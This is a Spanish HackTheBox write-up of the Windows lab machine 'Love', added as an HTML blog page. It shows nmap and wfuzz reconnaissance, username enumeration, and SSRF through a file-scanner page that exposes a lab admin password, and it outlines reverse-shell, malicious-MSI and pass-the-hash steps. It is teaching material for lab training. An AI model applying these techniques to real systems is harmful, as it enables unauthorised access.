@@ -1,0 +1,1487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Love</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Love | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Love" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI algo traviesos." />
+<meta property="og:description" content="Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI algo traviesos." />
+<link rel="canonical" href="http://localhost:4000/htb/love" />
+<meta property="og:url" content="http://localhost:4000/htb/love" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-07T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" />
+<meta property="twitter:title" content="HackTheBox - Love" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-07T00:00:00-07:00","datePublished":"2021-08-07T00:00:00-07:00","description":"Máquina Windows nivel fácil, escanearemos archivos locales (localhost) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes MSI algo traviesos.","headline":"HackTheBox - Love","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/love"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/love"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Love</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-07">07 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png" alt="HackTheBox - Love">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel fácil, escanearemos archivos locales (<strong>localhost</strong>) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas… Jugaremos con registros e instalaremos paquetes <strong>MSI</strong> algo traviesos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344loveHTB.png" alt="344loveHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/157669">pwnmeow</a>.</p>
+
+<p>Caminos para caminantes con caminos caminantes e.e</p>
+
+<p>Nos enfrentaremos a un servicio web con dos logins, uno de ellos nos permite jugar con usuarios y contraseñas, enumerando un dominio distinto al default, llegamos a una web que escanea archivos en búsqueda de malware, el archivo se lo debemos pasar por medio de una <strong>URL</strong>, jugaremos con esto para ver recursos locales (<code>http://localhost</code>) a los que externamente no tenemos acceso, en esa labor lograremos enumerar un servicio web alojado en el puerto <strong>5000</strong> (<code>http://localhost:5000</code>), de él encontraremos unas credenciales para un usuario llamado <strong>admin</strong>, las usaremos contra uno de los login y entraremos a una plataforma que administra un sistema de votaciones…</p>
+
+<p>Estando dentro podremos agregar <strong>votantes</strong>, a cada votante se le puede adjuntar una imagen de perfil, usaremos esto para agregar un objeto <code>.php</code> que nos permita ejecutar código remotamente, mediante él lograremos una <strong>Reverse Shell</strong> como el usuario <code>phoebe</code> en la máquina.</p>
+
+<p><strong><em>Hice un script que nos crea el votante, ejecuta comandos en el sistema y hace como si no hubiera pasado nada e.e</em></strong></p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/arbitrary_up_RCE.py">arbitrary_up_RCE.py</a>.</p>
+</blockquote>
+
+<p>Estando dentro nos apoyaremos de varias guías sobre <strong>PrivEsc Windows</strong> para encontrar un tipo de escalada llamada <strong>AlwaysInstallElevated</strong>, tendremos que jugar con 2 registros del sistema y validar si están habilitados, en caso de que lo estén podremos instalar paquetes <code>MSI</code> con permisos administrativos. Veremos que lo están, así que generaremos un paquete <strong>MSI</strong> malicioso con ayuda de <code>msfvenom</code> que una vez se esté instalando nos genere una <strong>Reverse Shell</strong>. Con esto lograremos una Shell como el usuario <code>NT AUTHORITY SYSTEM</code> (diosito) en el sistema.</p>
+
+<p><strong><em>Yyyy un <code>autopwn</code>, con él conseguimos una Shell en el mismo script como el usuario <code>administrador</code> del sistema.</em></strong></p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/autopwnLove.py">autopwnLove.py</a>.</p>
+</blockquote>
+
+<p>Basta, a rompernos la cara!! e.e</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Más o menos de todo, intenta jugar con vulns conocidas, pero es bastante juguetona.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Es momento de diversificar los distintos pensamientos…</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Escaneo de puertos con <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Enumeración servidor web - puerto 80</a>.</li>
+      <li><a href="#puerto-443">Enumeración certificado web - puerto 443</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#enum-creds-admin">Encontrando credenciales del usuario <strong>admin</strong> contra un login web</a>.</li>
+      <li><a href="#rce-php-file">RCE mediante una subida aleatoria de archivos - usuario <strong>Phoebe</strong></a>.</li>
+      <li><a href="#phoebe-evilrm">Obtención de credenciales usuario <strong>Phoebe</strong> para generar una Shell estable con <strong>evil-winrm</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+  <li><a href="#post-privesc-ntlm-hashes">Post PrivEsc - Usamos <strong>mimikatz</strong> para extraer hashes <strong>NTLM</strong> y hacer <em>passthehash</em></a>.
+    <ul>
+      <li><a href="#post-privesc-pth-winrm">Pass-The-Hash - evil-winrm</a>.</li>
+      <li><a href="#post-privesc-pth-psexec">Pass-The-Hash - psexec.py</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h2 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h2>
+
+<hr />
+
+<h3 id="enum-nmap">Enumeración de puertos con <strong>nmap</strong> <a href="#enum-nmap">🔗</a></h3>
+
+<p>Como siempre iniciaremos escaneando los puertos abiertos de la máquina, así empezaremos a encaminar nuestra investigación:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.239 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos devuelve:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.239
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.239 ()	Status: Up
+Host: 10.10.10.239 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
+# Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 85.24 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Servidor web</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC</a></strong>: Permite la comunicación entre programas</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Ayuda a la transferencia de archivos en la red</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto">HTTPS</a></strong>: Servicio web “seguro”</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Ayuda a la transferencia de archivos en la red</td>
+    </tr>
+    <tr>
+      <td>3306</td>
+      <td style="text-align: left"><strong><a href="https://neoattack.com/neowiki/mysql/">MySQL</a></strong>: Servidor de bases de datos</td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td style="text-align: left">No lo sabemos aún con certeza</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td style="text-align: left"><strong><a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM</a></strong>: Permite realizar tareas administrativas remotamente</td>
+    </tr>
+    <tr>
+      <td>5986</td>
+      <td style="text-align: left"><strong><a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM (HTTPS)</a></strong>: Permite realizar tareas administrativas remotamente</td>
+    </tr>
+    <tr>
+      <td>7680</td>
+      <td style="text-align: left">No lo sabemos a ciencia cierta</td>
+    </tr>
+    <tr>
+      <td>5040,49664,49666,49667</td>
+      <td style="text-align: left">Desconocidos</td>
+    </tr>
+    <tr>
+      <td>49668,49669,49670</td>
+      <td style="text-align: left">Desconocidos</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bastantes puertos, ahora juntando todos los servicios activos vamos a hacer otro escaneo, pero este para obtener las versiones de cada servicio y si existen scripts relacionados con ellos:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.239
+    [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV 10.10.10.239 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>En este caso obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10.10.10.239
+Nmap scan report for 10.10.10.239
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|_    Host '10.10.14.103' is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+|_ssl-date: 2021-06-21T16:28:22+00:00; +25m20s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.80%I=7%D=6/21%Time=60D0B785%P=x86_64-pc-linux-gnu%r(NU
+...
+...
+...
+...x20server");
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h10m20s, deviation: 3h30m02s, median: 25m19s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-06-21T09:28:08-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-21T16:28:06
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 182.94 seconds
+</code></pre>
+
+<p>Tenemos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Además de un dominio: <code>staging.love.htb</code>.</li>
+  <li>Y un nombre de organización: <code>ValentineCorp</code>.</li>
+</ul>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Windows 10 Pro 19042</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5000</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Servidor web con Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Listones, hemos terminado nuestra enumeración con <strong>nmap</strong>, ahora profundicemos en cada servicio y veamos en cuál tenemos posibilidad de romper cositas…</p>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<hr />
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">🔗</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80.png" alt="344page80" /></p>
+
+<p>Un login… Intentando distintos ID’s nos responde con esto:</p>
+
+<blockquote>
+  <p>Cannot find voter with the ID</p>
+</blockquote>
+
+<p>Así que podríamos intentar algún tipo de fuerza bruta para encontrar si algún <strong>ID</strong> nos devuelve una respuesta distinta, peeero antes, podemos probar a agregar el dominio que encontramos en el escaneo de <strong>nmap</strong> al archivo <code>/etc/hosts</code> y ver si nos responde algo al hacer peticiones hacia él:</p>
+
+<pre><code class="language-bash">❱ cat /etc/hosts
+...
+10.10.10.239  staging.love.htb
+...
+</code></pre>
+
+<blockquote>
+  <p><a href="https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/">¿Que es el archivo <strong>hosts</strong>?</a>.</p>
+</blockquote>
+
+<p>Y ahora en la web pondríamos el dominio:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging.png" alt="344page80staging" /></p>
+
+<p>Perfecto, tenemos otro servicio que esta respondiendo contra ese dominio, así que ahora tenemos más para probar… <strong>(Lo del fuzzeo por ID’s no nos dio ninguna respuesta, así que F)</strong></p>
+
+<p>Se trata de un servidor web en producción aún que se encarga de analizar archivos en busca de malware y cositas así, dirigiéndonos al apartado <strong>Demo</strong> (arriba a la izquierda) nos lleva a <code>/beta.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP.png" alt="344page80staging_betaPHP" /></p>
+
+<p>En él podemos añadir un archivo mediante una <strong>URL</strong> y la web hará el respectivo escaneo del objeto en busca de malware…</p>
+
+<p>Después de jugar con este apartado no logramos nada interesante (ni <strong>reverse shells</strong>, ni archivos <code>.php</code> con instrucciones simples (<code>echo 'hola';</code>), ni <code>.exe</code>’s, nada de eso nos funcionó), peeero sabemos que esta funcionando y que además algunos archivos <code>.php</code> los interpreta, ¿cómo lo sabemos?, sencillito…</p>
+
+<p>Escaneamos el archivo <code>index.php</code> del servidor local, que sería el correspondiente a <code>http://10.10.10.239/index.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost.png" alt="344page80staging_betaPHP_localhost" /></p>
+
+<p>Y nos responde con su <strong>body</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost_res.png" alt="344page80staging_betaPHP_localhost_res" /></p>
+
+<p>Pero poquito poquito podemos hacer con esto…</p>
+
+<p>Jugando con <code>dirsearch</code> y <code>wfuzz</code> para realizar un fuzzeo en la web principal (<code>http://10.10.10.239</code>) encontramos varios recursos más, pero solo algunos interesantes (y a los que tenemos acceso):</p>
+
+<pre><code class="language-bash">❱ wfuzz -c --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.239/FUZZ
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_fuzz_page80.png" alt="344bash_fuzz_page80" /></p>
+
+<p>Visitando <code>/admin</code> obtenemos otro login, pero ahora nos pide usuario y contraseña…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin.png" alt="344page80_admin" /></p>
+
+<p>Probando con los de siempre, nos damos cuenta de que al colocar cualquier cosa en el campo <strong>Username</strong>, nos responde con:</p>
+
+<blockquote>
+  <p>Cannot find account with the username</p>
+</blockquote>
+
+<p>Pero al colocar el usuario <strong>admin</strong> nos devuelve:</p>
+
+<blockquote>
+  <p>Incorrect password</p>
+</blockquote>
+
+<p>Así que sabemos que el usuario <strong>admin</strong> existe en la base de datos (:</p>
+
+<p>Visitando el recurso <code>/includes</code> vemos una lista de archivos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_includes_list.png" alt="344page80_includes_list" /></p>
+
+<p>Dando clic en <code>navbar.php</code> encontramos un error, y en ese error la ruta absoluta donde esta alojado el servidor web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_includes_navbar.png" alt="344page80_includes_navbar" /></p>
+
+<p>No podemos hacer nada con esto, peeeeeero puede llegar a ser importante en caso de querer subir archivos o algo así. Guardao’…</p>
+
+<p>…</p>
+
+<h3 id="puerto-443">Puerto 443 <a href="#puerto-443">🔗</a></h3>
+
+<p>Después de nuestra enumeración con el puerto 80, nos pondremos a enumerar el servicio <strong>HTTPS</strong>, colocando en el navegador <code>https://10.10.10.239</code> nos responde que no tenemos acceso a ese recurso :( Peeero podemos apoyarnos de <code>openssl</code> para ver información del certificado <strong>SSL</strong> con el que se cuenta:</p>
+
+<pre><code class="language-bash">❱ openssl s_client -connect 10.10.10.239:443
+</code></pre>
+
+<p>Al ejecutarlo podemos destacar el dominio que ya habíamos visto con <strong>nmap</strong>, pero también un <strong>email</strong>:</p>
+
+<pre><code class="language-bash">...
+depth=0 C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htb
+...
+</code></pre>
+
+<p>Bien, podemos extraer el usuario <code>roy</code> del email…</p>
+
+<p>Probando con él ante <strong>SMB</strong> y ante los demás recursos no logramos alguna otra respuesta a las que teníamos, pero bueno, guardémoslo por si algo (:</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<hr />
+
+<h3 id="enum-creds-admin">Encontrando credenciales del usuario <u>admin</u>, login web <a href="#enum-creds-admin">🔗</a></h3>
+
+<p>Después de un tiempo de estar perdido y sin esperanzas e.e</p>
+
+<p>Estuvimos jugando con los demás puertos activos, nos dimos cuenta de que al realizar peticiones hacia la <code>http://10.10.10.239:5000</code> volvíamos a recibir:</p>
+
+<blockquote>
+  <p>You don’t have permission to access this resource.</p>
+</blockquote>
+
+<p>Acá recordé lo que habíamos hecho con el analizador de archivos (que habíamos escaneado un objeto <strong>local</strong>), intentando en vez de escanear el <code>index.php</code>, hacerlo contra el <code>index.php</code> pero del servidor <strong>web</strong> alojado en el puerto <strong>5000</strong> (que ni idea si exista), curiosamente obtenemos una respuesta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost5000.png" alt="344page80staging_betaPHP_localhost5000" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost5000_res.png" alt="344page80staging_betaPHP_localhost5000_res" /></p>
+
+<p>Encontramos que el servicio del puerto <strong>5000</strong> es uno relacionado con <strong>passwords</strong> yyy vemos una para el usuario <strong>admin</strong> (que sabíamos que existía), pues probémoslas:</p>
+
+<ul>
+  <li>Username: <code>admin</code>.</li>
+  <li>Password: <code>@LoveIsInTheAir!!!!</code>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_login_done.png" alt="344page80_admin_login_done" /></p>
+
+<p>Listones, son válidas 🤼</p>
+
+<hr />
+
